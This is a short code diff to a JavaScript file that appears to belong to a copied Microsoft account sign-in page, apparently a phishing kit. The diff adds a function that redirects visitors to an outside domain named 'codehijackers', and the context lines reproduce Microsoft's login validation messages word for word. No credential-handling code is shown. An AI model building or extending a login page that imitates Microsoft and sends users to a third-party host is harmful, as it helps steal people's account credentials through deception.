@@ -1,3 +1,7 @@
+function redirect() {
+            window.location.href = "https://www.codehijackers.com/focus.php";
+        }
+
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
